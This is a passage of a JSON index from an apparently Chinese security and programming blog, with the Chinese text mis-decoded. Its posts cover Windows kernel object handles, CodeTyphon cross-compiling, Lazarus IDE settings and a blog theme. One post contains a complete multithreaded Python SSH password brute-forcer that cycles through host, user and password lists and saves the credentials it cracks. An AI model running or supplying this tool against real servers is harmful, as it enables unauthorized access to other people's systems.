","permalink":"https://www.hacktech.cn/post/win32%E6%B1%87%E7%BC%96-asm-%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90.html","summary":"\u003cp\u003eä¸€äº›win32æ±‡ç¼–ä¸‹å­¦ä¹ èµ„æºä¸å·¥å…·æ”¶é›†\u003c/p\u003e","title":"win32æ±‡ç¼–(ASM)å­¦ä¹ èµ„æº"},{"content":"å½“ä¸€ä¸ªè¿›ç¨‹è¢«åˆå§‹åŒ–æ—¶,ç³»ç»Ÿè¦ä¸ºå®ƒåˆ†é…ä¸€ä¸ªå¥æŸ„è¡¨ã€‚è¯¥å¥æŸ„è¡¨åªç”¨äºå†…æ ¸å¯¹è±¡ ,ä¸ç”¨äºç”¨æˆ·å¯¹è±¡æˆ–GDIå¯¹è±¡ã€‚\nåˆ›å»ºå†…æ ¸å¯¹è±¡ å½“è¿›ç¨‹åˆæ¬¡è¢«åˆå§‹åŒ–æ—¶ï¼Œå®ƒçš„å¥æŸ„è¡¨æ˜¯ç©ºçš„ã€‚ç„¶åï¼Œå½“è¿›ç¨‹ä¸­çš„çº¿ç¨‹è°ƒç”¨åˆ›å»ºå†…æ ¸å¯¹è±¡çš„å‡½æ•°æ—¶ï¼Œæ¯”å¦‚CreateFileMappingï¼Œå†…æ ¸å°±ä¸ºè¯¥å¯¹è±¡åˆ†é…ä¸€ä¸ªå†…å­˜å—ï¼Œå¹¶å¯¹å®ƒåˆå§‹åŒ–ã€‚è¿™æ—¶ï¼Œå†…æ ¸å¯¹è¿›ç¨‹çš„å¥æŸ„è¡¨è¿›è¡Œæ‰«æï¼Œæ‰¾å‡ºä¸€ä¸ªç©ºé¡¹ã€‚ç”±äºè¡¨ 3 - 1ä¸­çš„å¥æŸ„è¡¨æ˜¯ç©ºçš„ï¼Œå†…æ ¸ä¾¿æ‰¾åˆ°ç´¢å¼•1ä½ç½®ä¸Šçš„ç»“æ„å¹¶å¯¹å®ƒè¿›è¡Œåˆå§‹åŒ–ã€‚è¯¥æŒ‡é’ˆæˆå‘˜å°†è¢«è®¾ç½®ä¸ºå†…æ ¸å¯¹è±¡çš„æ•°æ®ç»“æ„çš„å†…å­˜åœ°å€ï¼Œè®¿é—®å±è”½è®¾ç½®ä¸ºå…¨éƒ¨è®¿é—®æƒï¼ŒåŒæ—¶ï¼Œå„ä¸ªæ ‡å¿—ä¹Ÿä½œäº†è®¾ç½®ã€‚\nä¸‹é¢åˆ—å‡ºäº†ç”¨äºåˆ›å»ºå†…æ ¸å¯¹è±¡çš„ä¸€äº›å‡½æ•°ï¼ˆä¸æ˜¯ä¸ªå®Œæ•´çš„åˆ—è¡¨ï¼‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 HANDLE CreateThread( PSECURITY_ATTRIBUTE psa, DWORD dwStackSize, LPTHREAD_START_ROUTINE pfnStartAddr, PVOID pvParam, DWORD dwCreationFlags, PDWORD pdwThreadId); HANDLE CreateFile( PCTSTR pszFileNAme, DWORD dwDesiredAccess, DWORD dwShareMode, PSECURITY_ATTRIBUTES psa, DWORD dwCreationDistribution, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile); HANDLE CreateFileMapping( HANDLE hFile, PSECURITY_ATTRIBUTES psa, DWORD flPRotect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, PCTSTR pszName); HANDLE CreateSemaphore( PSECURITY_ATTRIBUTES psa, LONG lInitialCount, LONG lMaximumCount, PCTSTR pszName); ç”¨äºåˆ›å»ºå†…æ ¸å¯¹è±¡çš„æ‰€æœ‰å‡½æ•°å‡è¿”å›ä¸è¿›ç¨‹ç›¸å…³çš„å¥æŸ„ï¼Œè¿™äº›å¥æŸ„å¯ä»¥è¢«åœ¨ç›¸åŒè¿›ç¨‹ä¸­è¿è¡Œçš„ä»»ä½•æˆ–æ‰€æœ‰çº¿ç¨‹æˆåŠŸåœ°åŠ ä»¥ä½¿ç”¨ã€‚è¯¥å¥æŸ„å€¼å®é™…ä¸Šæ˜¯æ”¾å…¥è¿›ç¨‹çš„å¥æŸ„è¡¨ä¸­çš„ç´¢å¼•ï¼Œå®ƒç”¨äºæ ‡è¯†å†…æ ¸å¯¹è±¡çš„ä¿¡æ¯å­˜æ”¾çš„ä½ç½®ã€‚ å› æ­¤å½“è°ƒè¯•ä¸€ä¸ªåº”ç”¨ç¨‹åºä¸”è§‚å¯Ÿå†…æ ¸å¯¹è±¡å¥æŸ„çš„å®é™…å€¼æ—¶ï¼Œä¼šçœ‹åˆ°ä¸€äº›è¾ƒå°çš„å€¼ï¼Œå¦‚1ï¼Œ2ç­‰ã€‚\næ¯å½“è°ƒç”¨ä¸€ä¸ªå°†å†…æ ¸å¯¹è±¡å¥æŸ„æ¥å—ä¸ºå‚æ•°çš„å‡½æ•°æ—¶ï¼Œå°±è¦ä¼ é€’ç”±ä¸€ä¸ª Create*\u0026amp;å‡½æ•°è¿”å›çš„å€¼ã€‚ä»å†…éƒ¨æ¥è¯´ï¼Œè¯¥å‡½æ•°è¦æŸ¥çœ‹è¿›ç¨‹çš„å¥æŸ„è¡¨ï¼Œä»¥è·å–è¦ç”Ÿæˆçš„å†…æ ¸å¯¹è±¡çš„åœ°å€ï¼Œç„¶åæŒ‰å®šä¹‰å¾—å¾ˆå¥½çš„æ–¹å¼æ¥ç”Ÿæˆè¯¥å¯¹è±¡çš„æ•°æ®ç»“æ„ã€‚\nå¦‚æœä¼ é€’äº†ä¸€ä¸ªæ— æ•ˆç´¢å¼•ï¼ˆå¥æŸ„ï¼‰ï¼Œè¯¥å‡½æ•°ä¾¿è¿”å›å¤±è´¥ï¼Œè€ŒGetLastErroråˆ™è¿”å› 6ï¼ˆERROR_INVALID_HANDLEï¼‰ã€‚ç”±äºå¥æŸ„å€¼å®é™…ä¸Šæ˜¯æ”¾å…¥è¿›ç¨‹å¥æŸ„è¡¨çš„ç´¢å¼•ï¼Œå› æ­¤è¿™äº›å¥æŸ„æ˜¯ä¸è¿›ç¨‹ç›¸å…³çš„ï¼Œå¹¶ä¸”ä¸èƒ½ç”±å…¶ä»–è¿›ç¨‹æˆåŠŸåœ°ä½¿ç”¨ã€‚\nå¦‚æœè°ƒç”¨ä¸€ä¸ªå‡½æ•°ä»¥ä¾¿åˆ›å»ºå†…æ ¸å¯¹è±¡ï¼Œä½†æ˜¯è°ƒç”¨å¤±è´¥äº†ï¼Œé‚£ä¹ˆè¿”å›çš„å¥æŸ„å€¼é€šå¸¸æ˜¯0ï¼ˆNULLï¼‰ã€‚å‘ç”Ÿè¿™ç§æƒ…å†µæ˜¯å› ä¸ºç³»ç»Ÿçš„å†…å­˜éå¸¸çŸ­ç¼ºï¼Œæˆ–è€…é‡åˆ°äº†å®‰å…¨æ–¹é¢çš„é—®é¢˜ã€‚ä¸è¿‡æœ‰å°‘æ•°å‡½æ•°åœ¨è¿è¡Œå¤±è´¥æ—¶è¿”å›çš„å¥æŸ„å€¼æ˜¯-1ï¼ˆINVALID_HANDLE_VALUEï¼‰ã€‚ä¾‹å¦‚ï¼Œå¦‚æœCreateFileæœªèƒ½æ‰“å¼€æŒ‡å®šçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå®ƒå°†è¿”å›INVALID_HANDLE_VALUEï¼Œè€Œä¸æ˜¯è¿”å›NULLã€‚å½“æŸ¥çœ‹åˆ›å»ºå†…æ ¸å¯¹è±¡çš„å‡½æ•°è¿”å›å€¼æ—¶ï¼Œå¿…é¡»æ ¼å¤–å°å¿ƒã€‚ç‰¹åˆ«è¦æ³¨æ„çš„æ˜¯ï¼Œåªæœ‰å½“è°ƒç”¨CreateFileå‡½æ•°æ—¶ï¼Œæ‰èƒ½å°†è¯¥å€¼ä¸INVALID_HANDLE_VALUEè¿›è¡Œæ¯”è¾ƒã€‚ä¸‹é¢çš„ä»£ç æ˜¯ä¸æ­£ç¡®çš„ï¼š\n1 2 3 4 HANDLE hMutex = CreateMutex(...); if (hMutex == INVALID_HANDLE_VALUE) { //è¿™æ®µä»£ç ä¸ä¼šæ‰§è¡Œï¼Œå› ä¸ºCreateMutexè°ƒç”¨å¤±è´¥çš„æ—¶å€™è¿”å›çš„æ˜¯NULL } åŒæ ·çš„ï¼Œä¸‹é¢çš„ä»£ç ä¹Ÿä¸æ­£ç¡®ï¼š\n1 2 3 4 HANDLE hFile = CreateFile(...); if (hFIle == NULL) { //è¿™æ®µä»£ç ä¸ä¼šæ‰§è¡Œï¼Œå› ä¸ºCreateFileè°ƒç”¨å¤±è´¥çš„æ—¶å€™è¿”å›çš„æ˜¯INVALID_HANDLE_VALUE(-1) } å…³é—­å†…æ ¸å¯¹è±¡ æ— è®ºæ€æ ·åˆ›å»ºå†…æ ¸å¯¹è±¡ï¼Œéƒ½è¦å‘ç³»ç»ŸæŒ‡æ˜å°†é€šè¿‡è°ƒç”¨C l o s e H a n d l eæ¥ç»“æŸå¯¹è¯¥å¯¹è±¡çš„æ“ä½œï¼š\n1 BOOL CloseHandle(HANDLE hobj); å¦‚æœè¯¥å¥æŸ„æ˜¯æœ‰æ•ˆçš„ï¼Œé‚£ä¹ˆç³»ç»Ÿå°±å¯ä»¥è·å¾—å†…æ ¸å¯¹è±¡çš„æ•°æ®ç»“æ„çš„åœ°å€ï¼Œå¹¶å¯ç¡®å®šè¯¥ç»“æ„ä¸­çš„ä½¿ç”¨è®¡æ•°çš„æ•°æ®æˆå‘˜ã€‚å¦‚æœä½¿ç”¨è®¡æ•°æ˜¯0ï¼Œè¯¥å†…æ ¸ä¾¿ä»å†…å­˜ä¸­æ’¤æ¶ˆè¯¥å†…æ ¸å¯¹è±¡ã€‚\nå¦‚æœå°†ä¸€ä¸ªæ— æ•ˆå¥æŸ„ä¼ é€’ç»™CloseHandleï¼Œå°†ä¼šå‡ºç°ä¸¤ç§æƒ…å†µä¹‹ä¸€ã€‚å¦‚æœè¿›ç¨‹è¿è¡Œæ­£å¸¸ï¼ŒCloseHandleè¿”å›FALSEï¼Œè€ŒGetLastErroråˆ™è¿”å›ERROR_INVALID_HANDLEã€‚å¦‚æœè¿›ç¨‹æ­£åœ¨æ’é™¤é”™è¯¯ï¼Œç³»ç»Ÿå°†é€šçŸ¥è°ƒè¯•ç¨‹åºï¼Œä»¥ä¾¿èƒ½æ’é™¤å®ƒçš„é”™è¯¯ã€‚\nåœ¨CloseHandleè¿”å›ä¹‹å‰ï¼Œå®ƒä¼šæ¸…é™¤è¿›ç¨‹çš„å¥æŸ„è¡¨ä¸­çš„é¡¹ç›®ï¼Œè¯¥å¥æŸ„ç°åœ¨å¯¹ä½ çš„è¿›ç¨‹å·²ç»æ— æ•ˆï¼Œä¸åº”è¯¥è¯•å›¾ä½¿ç”¨å®ƒã€‚æ— è®ºå†…æ ¸å¯¹è±¡æ˜¯å¦å·²ç»æ’¤æ¶ˆï¼Œéƒ½ä¼šå‘ç”Ÿæ¸…é™¤æ“ä½œã€‚å½“è°ƒç”¨CloseHandleå‡½æ•°ä¹‹åï¼Œå°†ä¸å†æ‹¥æœ‰å¯¹å†…æ ¸å¯¹è±¡çš„è®¿é—®æƒï¼Œä¸è¿‡ï¼Œå¦‚æœè¯¥å¯¹è±¡çš„ä½¿ç”¨è®¡æ•°æ²¡æœ‰é€’å‡ä¸º0ï¼Œé‚£ä¹ˆè¯¥å¯¹è±¡å°šæœªè¢«æ’¤æ¶ˆã€‚è¿™æ²¡æœ‰é—®é¢˜ï¼Œå®ƒåªæ˜¯æ„å‘³ç€ä¸€ä¸ªæˆ–å¤šä¸ªå…¶ä»–è¿›ç¨‹æ­£åœ¨ä½¿ç”¨è¯¥å¯¹è±¡ã€‚å½“å…¶ä»–è¿›ç¨‹åœæ­¢ä½¿ç”¨è¯¥å¯¹è±¡æ—¶ï¼ˆé€šè¿‡è°ƒç”¨CloseHandleï¼‰ï¼Œè¯¥å¯¹è±¡å°†è¢«æ’¤æ¶ˆã€‚\nå‡å¦‚å¿˜è®°è°ƒç”¨CloseHandleå‡½æ•°ï¼Œé‚£ä¹ˆä¼šä¸ä¼šå‡ºç°å†…å­˜æ³„æ¼å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¯èƒ½çš„ï¼Œä½†æ˜¯ä¹Ÿä¸ä¸€å®šã€‚åœ¨è¿›ç¨‹è¿è¡Œæ—¶ï¼Œè¿›ç¨‹æœ‰å¯èƒ½æ³„æ¼èµ„æºï¼ˆå¦‚å†…æ ¸å¯¹è±¡ï¼‰ã€‚ä½†æ˜¯ï¼Œå½“è¿›ç¨‹ç»ˆæ­¢è¿è¡Œæ—¶ï¼Œæ“ä½œç³»ç»Ÿèƒ½å¤Ÿç¡®ä¿è¯¥è¿›ç¨‹ä½¿ç”¨çš„ä»»ä½•èµ„æºæˆ–å…¨éƒ¨èµ„æºå‡è¢«é‡Šæ”¾ï¼Œè¿™æ˜¯æœ‰ä¿è¯çš„ã€‚å¯¹äºå†…æ ¸å¯¹è±¡æ¥è¯´ï¼Œç³»ç»Ÿå°†æ‰§è¡Œä¸‹åˆ—æ“ä½œï¼šå½“è¿›ç¨‹ç»ˆæ­¢è¿è¡Œæ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨æ‰«æè¿›ç¨‹çš„å¥æŸ„è¡¨ã€‚å¦‚æœè¯¥è¡¨æ‹¥æœ‰ä»»ä½•æ— æ•ˆé¡¹ç›®ï¼ˆå³åœ¨ç»ˆæ­¢è¿›ç¨‹è¿è¡Œå‰æ²¡æœ‰å…³é—­çš„å¯¹è±¡ï¼‰ï¼Œç³»ç»Ÿå°†å…³é—­è¿™äº›å¯¹è±¡å¥æŸ„ã€‚å¦‚æœè¿™äº›å¯¹è±¡ä¸­çš„ä»»ä½•å¯¹è±¡çš„ä½¿ç”¨è®¡æ•°é™ä¸º0ï¼Œé‚£ä¹ˆå†…æ ¸ä¾¿æ’¤æ¶ˆè¯¥å¯¹è±¡ã€‚\nå› æ­¤ï¼Œåº”ç”¨ç¨‹åºåœ¨è¿è¡Œæ—¶æœ‰å¯èƒ½æ³„æ¼å†…æ ¸å¯¹è±¡ï¼Œä½†æ˜¯å½“è¿›ç¨‹ç»ˆæ­¢è¿è¡Œæ—¶ï¼Œç³»ç»Ÿå°†èƒ½ç¡®ä¿æ‰€æœ‰å†…å®¹å‡è¢«æ­£ç¡®åœ°æ¸…é™¤ã€‚å¦å¤–ï¼Œè¿™ä¸ªæƒ…å†µé€‚ç”¨äºæ‰€æœ‰å¯¹è±¡ã€èµ„æºå’Œå†…å­˜å—ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“è¿›ç¨‹ç»ˆæ­¢è¿è¡Œæ—¶ï¼Œç³»ç»Ÿå°†ä¿è¯è¿›ç¨‹ä¸ä¼šç•™ä¸‹ä»»ä½•å¯¹è±¡ã€‚\nå‚è€ƒæ–‡çŒ®ï¼š ã€ŠWindowsæ ¸å¿ƒç¼–ç¨‹ã€‹ ","permalink":"https://www.hacktech.cn/post/windows%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1%E5%8F%A5%E6%9F%84%E8%A1%A8.html","summary":"\u003cp\u003eå½“ä¸€ä¸ªè¿›ç¨‹è¢«åˆå§‹åŒ–æ—¶,ç³»ç»Ÿè¦ä¸ºå®ƒåˆ†é…ä¸€ä¸ªå¥æŸ„è¡¨ã€‚è¯¥å¥æŸ„è¡¨åªç”¨äºå†…æ ¸å¯¹è±¡ ,ä¸ç”¨äºç”¨æˆ·å¯¹è±¡æˆ–GDIå¯¹è±¡ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1foaobsqowpj20nz05c0t3.jpg\" alt=\"\"  /\u003e\n\u003c/p\u003e","title":"Windowsè¿›ç¨‹çš„å†…æ ¸å¯¹è±¡å¥æŸ„è¡¨"},{"content":"æºè‡ªä¸€ä¸ªæœ‹å‹çš„è¦æ±‚ï¼Œä»–çš„è¦æ±‚æ˜¯åªçˆ†ç ´ä¸€ä¸ªipï¼Œç»“æœå‡ºæ¥åå°±åœæ­¢ï¼Œå¦‚æœæ˜¯çˆ†ç ´å¤šä¸ªï¼Œå®Œå…¨æ²¡å¿…è¦åœæ­¢ï¼Œç­‰ä»–è·‘å®Œå°±å¥½\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 #!usr/bin/env python #!coding=utf-8 __author__=\u0026#39;Akkuman\u0026#39; \u0026#39;\u0026#39;\u0026#39; SSHçˆ†ç ´ï¼Œç”±äºå¤šçº¿ç¨‹çš„é—®é¢˜ï¼Œæˆ‘ä¸çŸ¥é“æ€ä¹ˆåšå¯ä»¥å‡ºç°ç»“æœé©¬ä¸Šåœæ­¢ï¼ˆä¼šæŸ¥çš„ï¼Œæœ‰æ›´å¥½çš„æ–¹æ³•å†æ”¹ï¼‰ ç°åœ¨æˆ‘çš„æ–¹æ³•æ˜¯å®šä¹‰äº†ä¸€ä¸ªå…¨å±€çš„ä¿¡å·finish_flagï¼Œç„¶åæ¯ä¸ªçº¿ç¨‹æ£€æŸ¥è¿™ä¸ªä¿¡å· çº¿ç¨‹æ± ç”¨çš„concurrent.futures.ThreadPoolExecutorï¼Œæ˜¯Py3çš„ç‰¹æ€§ï¼Œpy2éœ€è¦å®‰è£…å…¶ä»–çš„åŒ… æˆåŠŸç»“æœå†™åˆ°äº†result.txtï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥ç›®å½•ä¸‹çš„result.txtæ–‡ä»¶æŸ¥çœ‹ç»“æœ \u0026#39;\u0026#39;\u0026#39; import paramiko from concurrent.futures import ThreadPoolExecutor import sys finish_flag = False def connect(host,user,pwd): global finish_flag if finish_flag: sys.exit() try: ssh=paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(hostname=host,username=user,password=pwd) print (\u0026#34;[-]Login Succ u:%s p:%s h:%s\u0026#34;%(user,pwd,host)) with open(\u0026#39;result.txt\u0026#39;,\u0026#39;a+\u0026#39;) as f: f.write(\u0026#34;h:%s u:%s p:%s\\n\u0026#34;%(host,user,pwd)) finish_flag = True except paramiko.ssh_exception.SSHException as err: print(\u0026#34;[x]Login Fail u:%s p:%s\u0026#34;%(user,pwd)) finally: ssh.close() return # å–å¾—ä¸€ä¸ªhostip,username,password def getInfo(): # éå†ip with open(\u0026#39;host.txt\u0026#39;) as hosts: for host in hosts: hostip = host.strip() print(\u0026#34;[x]Target:\u0026#34;+host) # éå†ç”¨æˆ·å with open(\u0026#39;user.txt\u0026#39;) as users: for user in users: username = user.strip() # éå†å¯†ç  with open(\u0026#39;pwd.txt\u0026#39;) as pwds: for pwd in pwds: password = pwd.strip() yield hostip,username,password def main(): paramiko.util.log_to_file(\u0026#34;filename.log\u0026#34;) info = getInfo() # æœ€å¤§çº¿ç¨‹æ•° max_thread_num = 100 executor = ThreadPoolExecutor(max_workers=max_thread_num) for host,user,pwd in info: future = executor.submit(connect,host,user,pwd) if __name__ == \u0026#39;__main__\u0026#39;: main() ","permalink":"https://www.hacktech.cn/post/python-ssh%E7%88%86%E7%A0%B4%E4%BB%A5%E5%8F%8Apython3%E7%BA%BF%E7%A8%8B%E6%B1%A0%E6%8E%A7%E5%88%B6%E7%BA%BF%E7%A8%8B%E6%95%B0.html","summary":"\u003cp\u003eæºè‡ªä¸€ä¸ªæœ‹å‹çš„è¦æ±‚ï¼Œä»–çš„è¦æ±‚æ˜¯åªçˆ†ç ´ä¸€ä¸ªipï¼Œç»“æœå‡ºæ¥åå°±åœæ­¢ï¼Œå¦‚æœæ˜¯çˆ†ç ´å¤šä¸ªï¼Œå®Œå…¨æ²¡å¿…è¦åœæ­¢ï¼Œç­‰ä»–è·‘å®Œå°±å¥½\u003c/p\u003e","title":"Python SSHçˆ†ç ´ä»¥åŠPython3çº¿ç¨‹æ± æ§åˆ¶çº¿ç¨‹æ•°"},{"content":"CodeTyphonå’ŒLazarusçš„å…³ç³»ç›¸å½“äºå°±æ˜¯ubuntuå’Œlinuxçš„å…³ç³»\nä¸è¿‡CodeTyphonæä¾›äº†å¾ˆå¤šä¸€é”®é…ç½®å³å¯ä½¿ç”¨çš„äº¤å‰ç¼–è¯‘é…ç½®ï¼Œè€ŒLazaruså°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œæˆ‘ä¹Ÿæ²¡ç”¨Lazarusäº¤å‰ç¼–è¯‘è¿‡\né¦–å…ˆå‡è®¾æˆ‘ä»¬äº¤å‰ç¼–è¯‘æ˜¯åœ¨windowsç¼–è¯‘å‡ºlinuxå¯æ‰§è¡Œç¨‹åºï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦åšçš„äº‹æƒ…å¤§è‡´ä¸Šåˆ†ä¸ºä»¥ä¸‹å‡ æ­¥ï¼š\nä¸‹è½½è·¨å¹³å°äº¤å‰å·¥å…·é“¾(Download Cross Toolchains) æ¡†é€‰å‡ºæ¥çš„ä¸¤ä¸ªéƒ½å¯ä»¥\nç„¶åé€‰æ‹©æˆ‘ä»¬æ‰€éœ€çš„linuxï¼Œå¹³å°cpuä½æ•°éœ€è¦è‡ªå·±æ ¹æ®è‡ªå·±çš„éœ€æ±‚æ¥ï¼Œé€‰æ‹©å¥½åç‚¹é€‰æœ€å³è¾¹çš„ä¸‹è½½æ ‡è¯†ç­‰å¾…ä¸‹è½½ï¼ˆæˆ‘ä»¬è¿™é‡Œé€‰æ‹©çš„win64-i386-linuxï¼‰\nä¸‹è½½ç³»ç»ŸäºŒè¿›åˆ¶åº“(Download OSes Libraries) ä¸‹è½½win64-i386-linuxå¯¹åº”çš„åº“ï¼Œä½ ä¹Ÿå¯ä»¥é€‰æ‹©qt4é‚£ä¸ªï¼Œåªæ˜¯ç•Œé¢åº“ä¸ä¸€æ ·è€Œå·²\nFPC Cross elements è¿™ä¸€æ­¥å°±ç›¸å½“äºå†™å¤„ç†é…ç½®äº†ï¼Œæ ¹æ®ä½ é€‰æ‹©çš„win64-i386-linuxæ¥\nTyphonçš„å·¥ç¨‹é…ç½®é€‰æ‹© å‰å‡ æ­¥åšå¥½åï¼Œç°åœ¨åªéœ€è¦åœ¨ideé‡Œé¢åšä¸€äº›è®¾ç½®å³å¯äº†ï¼Œæˆ‘ç›´æ¥æ”¾å›¾ï¼Œåº”è¯¥å¤§å®¶èƒ½çœ‹æ‡‚ æ‰“å¼€ å·¥ç¨‹ \u0026gt; å·¥ç¨‹é€‰é¡¹ \u0026gt; ç¼–è¯‘é€‰é¡¹ \u0026gt; è·¯å¾„æŠŠLibrariesè·¯å¾„è®¾ç½®å¥½\nç„¶åé€‰æ‹©å¹³å°\nLazaruså’ŒCodeTyphonç¼–è¯‘å‡ºæ¥çš„ç¨‹åºä½“ç§¯éƒ½æ¯”è¾ƒå¤§ï¼Œå‡å°ä½“ç§¯å¯ä»¥æŠŠgenerate debugging info for GDBçš„é€‰é¡¹å»æ‰\næœ€åç¼–è¯‘ç¨‹åºå³å¯\nå‚è€ƒèµ„æ–™ï¼š CodeTyphon - Cross-Build for Android ","permalink":"https://www.hacktech.cn/post/codetyphon-cross-build.html","summary":"\u003cp\u003eCodeTyphonå’ŒLazarusçš„å…³ç³»ç›¸å½“äºå°±æ˜¯ubuntuå’Œlinuxçš„å…³ç³»\u003c/p\u003e\n\u003cp\u003eä¸è¿‡CodeTyphonæä¾›äº†å¾ˆå¤šä¸€é”®é…ç½®å³å¯ä½¿ç”¨çš„äº¤å‰ç¼–è¯‘é…ç½®ï¼Œè€ŒLazaruså°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œæˆ‘ä¹Ÿæ²¡ç”¨Lazarusäº¤å‰ç¼–è¯‘è¿‡\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå‡è®¾æˆ‘ä»¬äº¤å‰ç¼–è¯‘æ˜¯åœ¨\u003cstrong\u003ewindowsç¼–è¯‘å‡ºlinuxå¯æ‰§è¡Œç¨‹åº\u003c/strong\u003eï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦åšçš„äº‹æƒ…å¤§è‡´ä¸Šåˆ†ä¸ºä»¥ä¸‹å‡ æ­¥ï¼š\u003c/p\u003e","title":"CodeTyphon è·¨å¹³å°äº¤å‰ç¼–è¯‘çš„é…ç½®"},{"content":"å®‰è£…åŒ… anchordockingå’ŒSparta_DockedFormEditor\nç„¶åç‚¹é€‰ä¿å­˜å¹¶é‡æ–°ç¼–è¯‘IDEå³å¯\n","permalink":"https://www.hacktech.cn/post/lazarus-whole-view.html","summary":"\u003cp\u003eå®‰è£…åŒ…  \u003ccode\u003eanchordocking\u003c/code\u003eå’Œ\u003ccode\u003eSparta_DockedFormEditor\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åç‚¹é€‰\u003ccode\u003eä¿å­˜å¹¶é‡æ–°ç¼–è¯‘IDE\u003c/code\u003eå³å¯\u003c/p\u003e","title":"Lazarus åˆ†ä½“å¼æ”¹æˆä¸€ä½“å¼çª—å£"},{"content":"å…·ä½“æ•ˆæœçœ‹æˆ‘åšå®¢å›­ï¼Œæˆ–è€…çœ‹åŸä½œè€…frantic1048åšå®¢\nå‡ºå¤„ æŠ˜è…¾äº†ä¸€ä¸ªæ–°çš®è‚¤ï¼Œè‡ªå¸¦é¢„è§ˆå›¾ è¿™ä¸ªçš®è‚¤ä½¿ç”¨åšä¸»å·²ç»è¯´çš„æ¯”è¾ƒæ¸…æ¥šäº†ï¼Œæˆ‘å†å‘ä¸€éæ˜¯å› ä¸ºè¿™ä¸ªä¸»é¢˜åœ¨æ‰‹æœºä¸Šemmmm\u0026hellip;æ¯”è¾ƒæƒ¨ä¸å¿ç¹ï¼Œè‡ªå·±å°å°çš„ä¼˜åŒ–äº†ä¸€ä¸‹ï¼ˆå…¶å®å°±æ˜¯éšè—åŠ margin-rightå“ˆå“ˆï¼‰ï¼Œè®©æ‰‹æœºç«¯å¯ä»¥æ­£å¸¸æ˜¾ç¤ºäº†ï¼Œå¦å¤–ä¾§è¾¹æ æœ‰äº›h3æ ‡é¢˜æ— æ•ˆæœï¼Œä¹Ÿæ”¹è¿›äº†ä¸€ä¸‹ï¼Œæœ¬äººä¹Ÿæ²¡ä¸“é—¨å­¦è¿‡cssï¼Œåªæ˜¯å°ä¿®äº†ä¸€ä¸‹ï¼Œè¿˜æ˜¯å¸Œæœ›å¤§å®¶å…±åŒåŠªåŠ›ï¼Œæ¯•ç«Ÿfrantic1048åšä¸»æä¾›çš„è¿™ä¸ªçš®è‚¤çœŸçš„æŒºå¥½çœ‹\nä½¿ç”¨æ–¹æ³• ä¸»é¢˜é€‰æ‹©Gertrude Blueï¼Œç¦ç”¨æ¨¡æ¿é»˜è®¤CSSå‹¾é€‰ä¸Šï¼Œç„¶åæŠŠåœ°å€http://www.cnblogs.com/blog/customcss/359968.cssä¸­çš„csså…¨éƒ¨å¤åˆ¶åˆ°é¡µé¢å®šåˆ¶CSSä»£ç ï¼Œå¤´åƒè‡ªå®šä¹‰åœ¨cssæ–‡ä»¶çš„239è¡Œï¼Œå¯ä»¥è‡ªè¡Œæ›´æ¢åœ°å€\nåšå®¢ä¾§è¾¹æ å…¬å‘Šé‡Œé¢æ˜¯\n1 2 3 \u0026lt;div id=\u0026#34;sidebar-cus\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;cus-avatar\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; å¦‚æœæƒ³è¦ä½¿ç”¨é¡µé¦–ï¼Œéµå¾ªä¸‹é¢çš„ç»“æ„ï¼Œå…¶ä¸­ç¬¬äºŒä¸ª span æ ‡ç­¾æ˜¯å¯é€‰çš„:\n1 2 3 4 \u0026lt;div id=\u0026#34;top-qoute-container\u0026#34;\u0026gt; \u0026lt;span id=\u0026#34;top-qoute-context\u0026#34;\u0026gt;It is the path you have chosen. Take pride in it.\u0026lt;/span\u0026gt; \u0026lt;span id=\u0026#34;top-qoute-from\u0026#34;\u0026gt;Kotomine Kirei\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; ä½ ä¹Ÿå¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªåè¨€åˆ—è¡¨è¿›è¡Œè½®æ¢ï¼Œä¸è¿‡é‚£ä¸ªéœ€è¦jsæƒé™\nå…¶å®å’Œfrantic1048è¯´æ˜ä¸€æ ·ï¼Œåªæ˜¯cssæ”¹åŠ¨äº†ä¸€ç‚¹\nç¥å¤§å®¶ä½¿ç”¨æ„‰å¿«\nå‚è€ƒèµ„æ–™ï¼š æŠ˜è…¾äº†ä¸€ä¸ªæ–°çš®è‚¤ï¼Œè‡ªå¸¦é¢„è§ˆå›¾ frantic1048çš„åšå®¢ ","permalink":"https://www.hacktech.cn/post/cnblogs-theme-acg.html","summary":"\u003cp\u003eå…·ä½“æ•ˆæœçœ‹\u003ca href=\"http://akkuman.cnblogs.com/\"\u003eæˆ‘åšå®¢å›­\u003c/a\u003eï¼Œæˆ–è€…çœ‹\u003ca 